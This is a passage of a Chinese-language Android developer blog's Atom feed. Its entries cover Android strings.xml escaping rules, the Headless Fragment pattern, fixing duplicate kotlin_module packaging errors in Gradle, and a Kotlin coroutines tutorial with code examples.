&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;test1 : test string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test2 : test &amp;quot;string&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test3 : test string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test4 : test &amp;apos;string&amp;apos; //IDE lint 报错&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test5 : test &amp;apos;string&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test6 : test &amp;apos;string&amp;apos; // 新GAP编译报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试环境:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gradle android plugin version: 3.1.0&lt;/li&gt;
&lt;li&gt;gradle version 4.4&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;(注意，最新的GAP&amp;gt;=3.3.2后，用&lt;code&gt;&amp;amp;apos;&lt;/code&gt;转义&lt;code&gt;&#39;&lt;/code&gt;不会在IDE lint中报错，但是会在&lt;code&gt;mergeResources&lt;/code&gt;task执行时报错)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;TLDR&lt;/p&gt;
&lt;p&gt;在android的strings.xml中的value转义规则如下&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;&lt;/code&gt; 转义只能用&lt;code&gt;\&amp;quot;&lt;/code&gt;, 不能用&lt;code&gt;&amp;amp;quot;&lt;/code&gt;，不转义的话不会报错，最终显示结果&lt;code&gt;&amp;quot;&lt;/code&gt;会被吞掉&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#39;&lt;/code&gt; 转义既可以用&lt;code&gt;&amp;amp;apos;&lt;/code&gt;, 也能用&lt;code&gt;\&#39;&lt;/code&gt;, 不转义的话 AS lint 会报错&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;gt;&lt;/code&gt; 不用转义&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;&lt;/code&gt; 必须转义为&lt;code&gt;&amp;amp;lt;&lt;/code&gt;，不转义的话 AS lint 会报错&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;amp;&lt;/code&gt; 必须转义为&lt;code&gt;&amp;amp;amp;&lt;/code&gt;，不转义的话 AS lint 会报错&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;@&lt;/code&gt; 、&lt;code&gt;?&lt;/code&gt; 可以不用转义&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>Headless Fragment 设计模式</title>
    <link href="https://deskid.github.io/2019/03/08/headless-fragment/"/>
    <id>https://deskid.github.io/2019/03/08/headless-fragment/</id>
    <published>2019-03-08T15:02:41.000Z</published>
    <updated>2019-03-08T15:32:27.115Z</updated>
    
    <content type="html"><![CDATA[<p>Headless Fragment 的定义：没有UI的fragment。也就是说 <code>onCreateView()</code>返回值为<code>null</code>。通常配合<code>setRetainInstance(true)</code>使用。后者可以让fragment在activity旋转重建时无需destroy。</p><p>为什么有 Headless Fragment这个概念，没有 view 的Fragment有什么功能呢？</p><a id="more"></a><p>在回答这两个问题之前，先回顾一下在面向对象编程中，代码复用的两种方式：</p><ol><li>组合</li><li>继承</li></ol><p>组合，我们可能会抽象出类似 utils、controller或者helper这种功能代码，业务逻辑是由这些功能代码块组合起来实现的。</p><p>优点：代码内聚，调用逻辑清晰可控。<br>缺点：是在Android端，需要注意太多的 Activity lifecycle细节，可能需要通过各种回调来处理跨生命周期的调用，而且还要注意防止内存泄漏。</p><p>继承，我们往往是在 BaseActivity 中实现公共功能，子类通过override、或者设置各种flag来实现功能的组合和差异化。</p><p>优点：Activity生命周期可感知，context获取方便<br>缺点：继承侵入性太大，“组合优于继承”，丧失了灵活性，无法处理跨越了 Activity 重建周期的事件回调。</p><p>Headless Fragment 在基于“组合”的代码复用方式的基础上，保留了“继承”复用的优点，同时回避了侵入性大等“继承”的缺点：</p><p>既有感知生命周期的能力（包括跨越activity重建周期的事件监听能力），也具有功能模块内聚性强，调用逻辑清晰的优点。</p><p>常见的使用场景：</p><ol><li><p>Android M runtime permission request，封装成callback，避免在同一个 override 中处理各种权限业务。</p></li><li><p>将 startActivityForResult 的 override 调用形式，封装成 callback 形式调用。好处同上。</p></li><li><p>非侵入式的监听activity、fragment生命周期。</p></li><li><p>处理和生命周期有关的短期异步操作。注意只能是短期，长时间的异步操作建议还是通过AsyncTask或者HandlerThread。</p></li></ol><p>很多常见的开源库都使用了这个小技巧：</p><ul><li><p><a href="https://github.com/zhihu/RxLifecycle" target="_blank" rel="noopener">RxLifecycle</a></p><p>通过<code>BindingFragment</code>监听activity的生命周期，并将<code>LifecycleEvent</code> 用<code>BehaviorSubject</code> emit 出去。</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Observable.interval(<span class="number">0</span>, <span class="number">2</span>, TimeUnit.SECONDS)</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        .compose(RxLifecycle.bind(<span class="keyword">this</span>)</span><br><span class="line">                .&lt;Long&gt;disposeObservableWhen(LifecycleEvent.DESTROY_VIEW))</span><br><span class="line">        .subscribe();</span><br></pre></td></tr></table></figure><p>当然现在有了arch Lifecycle后，有了更好的实现方式。</p></li><li><p>Google Android Architecture 中的 ViewModel 实现</p><p>通过设置<code>HolderFragment.setRetainInstance(true)</code>，实现 <code>ViewModel</code> 绑定Activity生命周期的同时，又跨越 Activity 重建过程。</p><p><img src="http://img0.didiglobal.com/static/driver_xml_image/img/static/3869f2a4f8d2c3c99d015b63d79da96ed7837770.jpg" alt></p></li></ul><ul><li><p><a href="https://github.com/tbruyelle/RxPermissions" target="_blank" rel="noopener">RxPermissions</a></p><p>通过<code>RxPermissionsFragment</code> 将 <code>onRequestPermissionsResult</code> 的override式调用转化为callback式调用。</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rxPermissions</span><br><span class="line">    .request(Manifest.permission.CAMERA)</span><br><span class="line">    .subscribe(granted -&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (granted) &#123; <span class="comment">// Always true pre-M</span></span><br><span class="line">           <span class="comment">// I can control the camera now</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">// Oups permission denied</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Headless Fragment 的定义：没有UI的fragment。也就是说 &lt;code&gt;onCreateView()&lt;/code&gt;返回值为&lt;code&gt;null&lt;/code&gt;。通常配合&lt;code&gt;setRetainInstance(true)&lt;/code&gt;使用。后者可以让fragment在activity旋转重建时无需destroy。&lt;/p&gt;
&lt;p&gt;为什么有 Headless Fragment这个概念，没有 view 的Fragment有什么功能呢？&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>关于 `META-INF/library_release.kotlin_module`</title>
    <link href="https://deskid.github.io/2019/03/05/about-kotlin-module/"/>
    <id>https://deskid.github.io/2019/03/05/about-kotlin-module/</id>
    <published>2019-03-05T15:27:43.000Z</published>
    <updated>2019-08-26T18:43:45.853Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">More than one file was found with OS independent path &apos;META-INF/library_release.kotlin_module&apos;</span><br></pre></td></tr></table></figure><p>最近在引入两个kotlin写的aar库时编译器报了这样的一个错误。说是打包时存在两个相同的文件，文件路径是<code>META-INF/library_release.kotlin_module</code>。</p><p>这个文件是干什么用的呢？</p><a id="more"></a><p>kotlin 支持文件级别的申明，也就是说我们可以在一个文件中申明变量、方法，而不像Java，必须有一个类。</p><p>每个 kotlin source file 会默认创建一个同样命名，但首字母大写，加了“Kt”后缀的类。</p><p>比如<code>FileExt.kt</code> 会编译成<code>FileExtKt.class</code></p><p>在Java代码中，可以通过编译后的类名访问申明在顶层的函数和变量。因此，在同一包名下，不支持两个命名相同的kotlin source文件。</p><p>通过<code>@file:JvmName(&quot;CustomName&quot;)</code>可以显式的指定一个文件编译后的类名，通过<code>@file:JvmMultifileClass</code>可以指定多个文件共享一个类名。</p><p>为了实现这个功能，kotlin专门引入了一个resource文件，用来指导kotlin的编译。</p><p>没错，这个文件就是 <code>META-INF/&lt;module_name&gt;.kotlin_module</code>.</p><p>网上有很多人解决上面的问题时，将 <code>.kotlin_module</code> 文件在打包流程中exclude，实际上这种做法是不正确的。</p><p>其实只需要保证module名字没有冲突，生成的<code>.kotlin_module</code>文件自然也就不会冲突。</p><p>在 gradle 工程中，这个文件的名字由当前工程的<code>module</code>名字 + <code>build variant</code>组成。</p><p>例如在一个 aar sdk 中，你可能会创建一个叫做 <code>library</code>的module 文件夹，<code>release</code>发布出去后，生成的aar中会带有<code>'META-INF/library_release.kotlin_module'</code>这个文件。</p><p>如果其他的工程也使用了相同的<code>module name</code>，比如另外一个aar刚好也用了<code>library</code>作为module名称，就会报上面的错误。</p><p>通过kotlinOptions可以指定<code>moduleName</code>名称。比如下面的这段代码会将<code>moduleName</code>修改为项目的<code>group.artifact</code>名字。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion 25</span><br><span class="line">    buildToolsVersion &quot;25.0.0&quot;</span><br><span class="line"></span><br><span class="line">    compileOptions &#123;</span><br><span class="line">        kotlinOptions.freeCompilerArgs += [&apos;-module-name&apos;, &quot;$PUBLISH_GROUP_ID.$PUBLISH_ARTIFACT_ID&quot;]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        minSdkVersion 8</span><br><span class="line">        targetSdkVersion 25</span><br><span class="line">        versionCode 1</span><br><span class="line">        versionName &quot;1.0.5&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled false</span><br><span class="line">            proguardFiles getDefaultProguardFile(&apos;proguard-android.txt&apos;), &apos;proguard-rules.pro&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：<code>PUBLISH_GROUP_ID</code> 和 <code>PUBLISH_ARTIFACT_ID</code> 是自定义的变量，你可以将它改为自己的项目中的具体值。</p><p>参考文章：<br><a href="https://github.com/Takhion/android-extras-delegates/issues/1" target="_blank" rel="noopener">https://github.com/Takhion/android-extras-delegates/issues/1</a><br><a href="https://blog.jetbrains.com/kotlin/2015/09/kotlin-m13-is-out/" target="_blank" rel="noopener">https://blog.jetbrains.com/kotlin/2015/09/kotlin-m13-is-out/</a><br><a href="http://kotlinlang.org/docs/reference/java-interop.html#package-level-functions" target="_blank" rel="noopener">http://kotlinlang.org/docs/reference/java-interop.html#package-level-functions</a></p>]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;More than one file was found with OS independent path &amp;apos;META-INF/library_release.kotlin_module&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最近在引入两个kotlin写的aar库时编译器报了这样的一个错误。说是打包时存在两个相同的文件，文件路径是&lt;code&gt;META-INF/library_release.kotlin_module&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这个文件是干什么用的呢？&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title>Kotlin Coroutines Guide</title>
    <link href="https://deskid.github.io/2018/11/14/kotlin_coroutines_guide/"/>
    <id>https://deskid.github.io/2018/11/14/kotlin_coroutines_guide/</id>
    <published>2018-11-14T14:40:27.000Z</published>
    <updated>2018-11-14T14:43:01.302Z</updated>
    
    <content type="html"><![CDATA[<p>本文将从以下3个方面介绍 Kotlin Coroutines</p><ul><li>概念</li><li>使用方法</li><li>内部实现原理</li></ul><p>本文的实例代码基于Kotlin 1.3.0 和 kotlinx.coroutines 1.0.0。</p><a id="more"></a><blockquote><p>众所周知，在高负荷下，阻塞和轮询是不好的。而且这个世界正在变得越来越依赖于push和异步。许多语言已经(starting with C# in 2012) 通过 async/await 关键字支持异步。 而在Kotlin, 我们抽象了这个概念，从而 一些库就可以实现各自的异步支持，所以 async 在kotlin中不再是关键字,而是一个function。</p></blockquote><blockquote><p>这个设计是为了集成各种异步API: futures/promises, callback-passing, 等等。这个设计足够抽象，甚至可以表达 lazy generators (yield) 和其他用例。</p></blockquote><p>Kotlin 团队推出 coroutines 来提供一种简单的方式来编写 concurrent 编程。 也许我们中的大多数已经在用各种基于线程的并发工具，比如 Java’s concurrency API，这已经是一套很成熟的API了。</p><h3 id="java-concurrency-vs-kotlin-coroutines">Java Concurrency vs. Kotlin Coroutines</h3><blockquote><p>如果你仍然对Java中的 <strong>threading</strong> 和 <strong>concurrency</strong> 感到困惑，我建议你阅读这本书<a href="https://www.amazon.com/gp/product/0321349601/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0321349601&amp;linkCode=as2&amp;tag=swirtzamzncom-20&amp;linkId=c0de3483e96ad786bfda5e66d0f25284" target="_blank" rel="noopener">《Java Concurrency in Practice》</a>。</p></blockquote><p>尽管 Java’s 并发工具已经工程化的很好了, 但还是很难用。另一个问题是Java 并不鼓励非阻塞编程，所以你总是发现自己在start一个线程后才发现引入了过度开销和阻塞计算 (due to locks, sleeps, waits, etc.)。 应用 <a href="http://tutorials.jenkov.com/java-concurrency/non-blocking-algorithms.html" target="_blank" rel="noopener">non-blocking patterns</a> 很难而且极易犯错。</p><p>Kotlin 协程则相反, 背后帮程序员处理好了一堆复杂的事情，调用则显得简单，看起来像命令式编程，他们提供了不用阻塞线程就可以执行异步代码的一种方式, 对应用来说这又提供了一种新的可能。不是阻塞线程，而是<strong>suspended</strong>计算。</p><p>许多别的文章将coroutines视为“light-weight threads”; 但是coroutines不是我们Java传统意义上的线程。与线程相比, 新建一个coroutines 的代价非常廉价。一个原因是coroutines没有被映射到native的线程。正如我们将会看到的, coroutines 实际上是是被库管理着在一个线程池里面执行的。<br>另外一个很重要的不同点在于“<strong>limitation”</strong>: 线程受限于可用的native threads, coroutines 则几乎没有限制, 即使是上千个协程也可以一下子开启。</p><h3 id="concurrent-programming-style">Concurrent Programming Style</h3><p>在不同的语言中asynchronous/concurrent的实现风格往往不同：</p><ul><li>Callback-based (JavaScript)</li><li>Future/Promise-based (Java, JavaScript)</li><li>Async/Await-based (C#) and more</li></ul><p>所有的这些概念都可以用coroutines实现，kotlin没有直接依赖任何实现风格，而且，额外的一个好处是，coroutines可以像命令式编程一样序列化编写代码，尽管运行时是并发的。</p><h4 id="the-concept-of-kotlin-coroutines">The Concept of Kotlin Coroutines</h4><p><a href="https://en.wikipedia.org/wiki/Coroutine" target="_blank" rel="noopener">“Coroutine”</a> 的概念并不是新鲜事物。根据wiki，早在1958就有人提出这个概念. 许多现代编程语言也提供了native支持: C#, Go, Python, Ruby, etc. 包括Kotlin coroutines的实现在内, 都是基于<a href="https://en.wikipedia.org/wiki/Continuation" target="_blank" rel="noopener">“Continuations”</a>, Continuations 是计算机程序的状态控制的一层抽象。</p><h3 id="getting-started-with-coroutines">Getting Started with Coroutines</h3><p><a href="https://github.com/Kotlin/kotlinx.coroutines#using-in-your-projects" target="_blank" rel="noopener">reference</a><br><a href="https://github.com/s1monw1/Kotlin_Examples" target="_blank" rel="noopener">GitHub Kotlin_Examples</a></p><h4 id="kotlin-coroutines-ingredients">Kotlin Coroutines Ingredients</h4><p>正如我们提到的，kotlin提供了一套易于理解的高阶api，首先我们了解下一个新修饰符<code>suspend</code>，suspend表示一个方法是“suspending”的。</p><h3 id="suspending-functions">Suspending Functions</h3><p>在Coroutines中我们说一个方法是“suspending”的是指这个方法可能会在任何一行命令中挂起，被<code>suspend</code>修饰的方法只能在 coroutines 或者其他suspending functions中调用。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">myMethod</span><span class="params">(p: <span class="type">String</span>)</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以把<code>coroutine</code>看做一个序列的常规方法调用，只不过这个序列执行完成后会额外提供一个运行结果。</p><h2 id="hands-on">Hands-On</h2><p>现在来看一个实际的例子</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> = runBlocking &#123; <span class="comment">//(1)</span></span><br><span class="line">    <span class="keyword">val</span> job = GlobalScope.launch &#123; <span class="comment">//(2)</span></span><br><span class="line">        <span class="keyword">val</span> result = suspendingFunction() <span class="comment">//(3)</span></span><br><span class="line">        print(<span class="string">"<span class="variable">$result</span>"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    print(<span class="string">"The result: "</span>)</span><br><span class="line">    job.join() <span class="comment">//(4)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// prints "The result: 5"</span></span><br></pre></td></tr></table></figure><p>在这个例子中，有两个新方法**(1)** <code>runBlocking</code> 、 <strong>(2)</strong> <code>launch</code>，它们都是 <strong>coroutine builders</strong>。我们可以利用各种各样的builder来实现不同的业务需求：</p><ul><li><code>launch</code> (fire and forget, can also be canceled)</li><li><code>async</code> (返回 promise)</li><li><code>runBlocking</code> (阻塞线程)</li><li>etc.</li></ul><p>我们可以在各种scopes中开启一个coroutines，在这个例子中，<code>GlobalScope</code> 被用来 <code>launch</code>一个和App拥有同样生命周期的 coroutine。这种方式仅仅用在文中的例子里，在实际应用中还是要看具体业务场合。 按照 <a href="https://medium.com/@elizarov/structured-concurrency-722d765aa952" target="_blank" rel="noopener">“structured concurrency”</a>的概念, 我们需要将coroutines限制在不同的scopes下面，从而更好的维护和管理.  <a href="https://kotlin.github.io/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines.experimental/-coroutine-scope/index.html" target="_blank" rel="noopener">CoroutineScope</a>.</p><p>接下来看这个代码做了什么：<br>由**(2)** <code>launch</code>开启的内部的coroutine是实际上干活的，我们调用**(3)** suspending function，然后coroutine打印出结果。在启动coroutine 后，主线程在coroutine结束前打印 <code>The result:</code>。 <strong>(2)</strong> <code>launch</code>返回的是一个<code>Job</code>，通过它可以取消或者**(4)** <code>join()</code>等待 coroutines 完成。由于 <code>join()</code> 可能会suspend， 所以我们需要将它包在另外一个coroutine——<code>runBlocking</code>中。<br><code>runBlocking</code> coroutine builder 被设计用来将常规的阻塞代码桥接到suspending function。这个功能常常被用在main function和 test中。<a href="https://kotlin.github.io/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines.experimental/run-blocking.html" target="_blank" rel="noopener">API</a>。如果不调用join()，那么这个程序会在coroutine打印出结果前结束掉。</p><p>在 <code>runBlocking</code> coroutine scope外 <code>launch</code>一个coroutine也是可以的。我们只需将<code>GlobalScope.launch</code> 改为 <code>launch</code>。同时，我们也可以去掉<code>join</code>因为<code>runBlocking</code>在所有的child coroutines完成前不会结束。这个例子也是 <strong>structured concurrency</strong>的一个例子, 接下来会详细介绍这个概念。</p><h3 id="structured-concurrency">Structured Concurrency</h3><p>正如之前提到的，我们可以按照某种层次结构组织管理coroutines。假设在UI界面的某一个特定事件上我们需要中断。如果我们在这个UI上开启一个 coroutines来处理某个任务, 而且当主界面中断时，这个任务也应该被中断。值得注意的是，每个coroutine都可以运行在不同的scope内。 我们可以将多个coroutines在同一个scope内管理，这样就可以同时取消。下面的例子复用了上一节的例子，只不过 <code>launch</code> coroutines 在 <code>runBlocking</code> 的scope 下。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    runBlocking &#123;</span><br><span class="line">        launch &#123;</span><br><span class="line">            delay(<span class="number">500</span>)</span><br><span class="line">            println(<span class="string">"Hello from launch"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        println(<span class="string">"Hello from runBlocking after launch"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    println(<span class="string">"finished runBlocking"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下</p><blockquote><p>Hello from runBlocking after launch<br>Hello from launch<br>finished runBlocking</p></blockquote><p>从上面的输出可以看出<code>runBlocking</code> 会等待子coroutine<code>launch</code>完成。因此，我们可以利用这个结构来将coroutine的取消操作代理给子coroutines：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    runBlocking &#123;</span><br><span class="line">        <span class="keyword">val</span> outerLaunch = launch &#123;</span><br><span class="line">            launch &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    delay(<span class="number">300</span>)</span><br><span class="line">                    println(<span class="string">"Hello from first inner launch"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            launch &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    delay(<span class="number">300</span>)</span><br><span class="line">                    println(<span class="string">"Hello from second inner launch"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        println(<span class="string">"Hello from runBlocking after outer launch"</span>)</span><br><span class="line">        delay(<span class="number">800</span>)</span><br><span class="line">        outerLaunch.cancel()</span><br><span class="line">    &#125;</span><br><span class="line">    println(<span class="string">"finished runBlocking"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下</p><blockquote><p>Hello from runBlocking after outer launch<br>Hello from first inner launch<br>Hello from second inner launch<br>Hello from first inner launch<br>Hello from second inner launch<br>finished runBlocking</p></blockquote><p>在这个例子中，可以看到在<code>runBlocking</code>这个scope下，<code>launch</code>先创建了一个outer coroutine，接着又创建了两个内部coroutines，当我们取消 outer coroutine时，会同时委托到inner coroutines进行cancel操作。这个机制同样适用于错误控制，如果有异常从inner coroutines内部抛出，那么同一个scope内的所有coroutines都会停止。</p><h4 id="custom-scope">Custom Scope</h4><p>这一节,我们将创建自己的<code>CoroutineScope</code>。在上个例子中我们为了简单起见，使用<code>runBlocking</code>scope，而在实际应用中创建自己管理的scope是有必要的。创建也很简单，使用 <code>coroutineScope</code> builder。文档如下:</p><blockquote><p>Creates new [CoroutineScope] and calls the specified suspend block with this scope. The provided scope inherits its [coroutineContext][CoroutineScope.coroutineContext] from the outer scope, but overrides context’s [Job]. This function is designed for a <em>parallel decomposition</em> of work. <strong>When any child coroutine in this scope fails, this scope fails, and all the rest of the children are canceled</strong> (for a different behavior see [supervisorScope]).</p></blockquote><blockquote><p>创建一个新的[CoroutineScope]并且执行这个scope内指定的suspend block。 新scope会继承外部scope的[CoroutineScope.coroutineContext]，但是会覆盖context的[Job]对象。这个方法可以用来<em>parallel decomposition</em>业务。任何child coroutines 失败，整个scope失败，并且其他的子coroutines都会被取消（如果要自定义这个行为可以使用[supervisorScope]）。</p></blockquote><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> = runBlocking &#123;</span><br><span class="line">    coroutineScope &#123;</span><br><span class="line">        <span class="keyword">val</span> outerLaunch = launch &#123;</span><br><span class="line">            launch &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    delay(<span class="number">300</span>)</span><br><span class="line">                    println(<span class="string">"Hello from first inner launch"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            launch &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    delay(<span class="number">300</span>)</span><br><span class="line">                    println(<span class="string">"Hello from second inner launch"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        println(<span class="string">"Hello from runBlocking after outer launch"</span>)</span><br><span class="line">        delay(<span class="number">800</span>)</span><br><span class="line">        outerLaunch.cancel()</span><br><span class="line">    &#125;</span><br><span class="line">    println(<span class="string">"finished coroutineScope"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子和我们之前看到的非常相似。只不过最外层的scope变成了我们自定义的scope。了解更多可以参考<a href="https://medium.com/@elizarov/structured-concurrency-722d765aa952" target="_blank" rel="noopener">this post on structured concurrency with coroutines</a>.</p><h3 id="going-deeper">Going deeper</h3><p>下面举一个更具体的例子，比如在应用中发送一封邮件。<br>请求接收者的地址和渲染消息内容是两个耗时的任务，而且互相独立。使用kotlin coroutines你可以同时执行这两个task：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">sendEmail</span><span class="params">(r: <span class="type">String</span>, msg: <span class="type">String</span>)</span></span>: <span class="built_in">Boolean</span> &#123; <span class="comment">//(6)</span></span><br><span class="line">    delay(<span class="number">2000</span>)</span><br><span class="line">    println(<span class="string">"Sent '<span class="variable">$msg</span>' to <span class="variable">$r</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">getReceiverAddressFromDatabase</span><span class="params">()</span></span>: String &#123; <span class="comment">//(4)</span></span><br><span class="line">    delay(<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"coroutine@kotlin.org"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">sendEmailSuspending</span><span class="params">()</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">    <span class="keyword">val</span> msg = GlobalScope.async &#123; <span class="comment">//(3)</span></span><br><span class="line">        delay(<span class="number">500</span>)</span><br><span class="line">        <span class="string">"The message content"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">val</span> recipient = GlobalScope.async &#123; </span><br><span class="line">        getReceiverAddressFromDatabase() <span class="comment">//(5)</span></span><br><span class="line">    &#125; </span><br><span class="line">    println(<span class="string">"Waiting for email data"</span>)</span><br><span class="line">    <span class="keyword">val</span> sendStatus = GlobalScope.async &#123;</span><br><span class="line">        sendEmail(recipient.await(), msg.await()) <span class="comment">//(7)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sendStatus.await() <span class="comment">//(8)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> = runBlocking &#123; <span class="comment">//(1)</span></span><br><span class="line">    <span class="keyword">val</span> job = GlobalScope.launch &#123;</span><br><span class="line">        sendEmailSuspending() <span class="comment">//(2)</span></span><br><span class="line">        println(<span class="string">"Email sent successfully."</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    job.join() <span class="comment">//(9)</span></span><br><span class="line">    println(<span class="string">"Finished"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，和之前一样，我们在<code>runBlocking</code> builder 里面起了一个**(1)** <code>launch</code> builder，这样在**(9)** 处就可以等待coroutines结束了。和这个结构一样，<strong>(2)</strong><code>sendEmailSuspending</code> suspending function也不是什么新的语法。这个方法内调用了一个**(3)** inner coroutine来获取message，同时调用另一个<code>suspend</code>方法<code>getReceiverAddressFromDatabase</code>获取发送地址。我们在**(5)** <code>async</code> built的两个单独的coroutines里同时执行这两个task。<br>注意，这里的<code>delay</code>表示的coroutines中的一种非阻塞挂起, 和<code>Thread.sleep</code>类似，这里用来模拟耗时操作。</p><h4 id="the-async-coroutine-builder">The async Coroutine Builder</h4><p><code>async</code> builder 在概念上很容易理解。在其他语言里async会返回一个<a 